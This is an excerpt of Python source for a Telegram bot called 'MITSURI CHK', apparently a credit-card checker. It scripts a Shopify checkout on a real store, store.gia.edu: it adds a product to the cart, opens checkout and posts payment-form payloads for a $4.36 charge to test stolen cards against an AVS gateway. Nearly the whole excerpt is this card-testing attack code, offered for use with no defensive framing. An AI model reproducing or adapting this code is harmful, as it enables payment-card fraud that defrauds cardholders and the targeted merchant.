...
@Client.on_message(filters.command("te", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>TERRENEITOR</code>
PASARELA: <code>SHOPIFY AVS $4.36</code> </b>""")
...
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>TERRENEITOR</code></b>
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '31793327112323'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://store.gia.edu/cart/add', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://store.gia.edu/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.store.gia.edu"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=41457254531&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B17122910111&checkout%5Btotal_price%5D=436&checkout_submitted_request_url=https%3A%2F%2Fstore.gia.edu%2F31818678403%2Fcheckouts%2Fee8c7c13a0444e5066a99cff0ef71845%3Fstep%3Dpayment_method&checkout_submitted_page_id=f056c33b-8B6C-4970-A4CC-77AD1C543EF2&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=796&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
...
<b>MITSURI CHK - SH AVS $4.36 USD</b>
